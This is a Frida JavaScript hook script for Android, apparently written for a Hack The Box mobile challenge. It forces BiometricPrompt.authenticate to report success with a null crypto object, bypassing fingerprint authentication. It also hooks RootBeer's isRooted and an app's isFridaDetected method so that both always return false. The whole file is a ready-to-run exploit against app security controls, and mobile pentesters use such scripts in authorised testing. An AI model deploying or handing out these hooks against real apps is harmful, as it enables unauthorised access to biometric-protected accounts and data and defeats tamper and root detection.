/*
    Bypass fingerprint authentication if the app accept NULL cryptoObject in onAuthenticationSucceeded(...).
    This script should automatically bypass fingerprint when authenticate(...) method will be called.
*/

console.log("Fingerprint hooks loaded!");

Java.perform(function () {
    try { hookBiometricPrompt_authenticate(); }
    catch (error) { console.log("hookBiometricPrompt_authenticate not supported on this android version") }
    try{rootBypass();} catch (error) { console.log("RootBeer not found, root bypass not applied") }
    try{fridaBypass();} catch (error) { console.log("Frida detection method not found, frida bypass not applied")}
});


var cipherList = [];
var StringCls = null;
Java.perform(function () {
    StringCls = Java.use('java.lang.String');

});

function getAuthResult(resultObj, cryptoInst) {
    try {
        var authenticationResultInst = resultObj.$new(cryptoInst, null, 0, false);
    } catch (error) {
        try {
            var authenticationResultInst = resultObj.$new(cryptoInst, null, 0);
        } catch (error) {
            try {
                var authenticationResultInst = resultObj.$new(cryptoInst, null);
            }
            catch (error) {
                try {
                    var authenticationResultInst = resultObj.$new(cryptoInst, 0);
                } catch (error) {
                    var authenticationResultInst = resultObj.$new(cryptoInst);
                }
            }
        }
    }
    console.log("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
    return authenticationResultInst;
}

function getBiometricPromptAuthResult() {
    var sweet_cipher = null;
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var cryptoInst = cryptoObj.$new(sweet_cipher);
    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
    return authenticationResultInst
}

function hookBiometricPrompt_authenticate() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        console.log("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}

function enumMethods(targetClass) {
    var hook = Java.use(targetClass);
    var ownMethods = hook.class.getDeclaredMethods();

    return ownMethods;
}

// Hook RootBeer's isRooted method
function rootBypass() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.overload().implementation = function () {
        console.log('\nRoot detection bypassed');
        return false; // Always return false to indicate the device is not rooted
    };
}

// Hook the isFridaDetected native method
function fridaBypass() {
    var MainActivity = Java.use('com.hackthebox.myapp.HomeActivity');
    MainActivity.isFridaDetected.implementation = function () {
        console.log('Frida detection bypassed');
        return false; // Always return false to indicate Frida is not detected
    };
}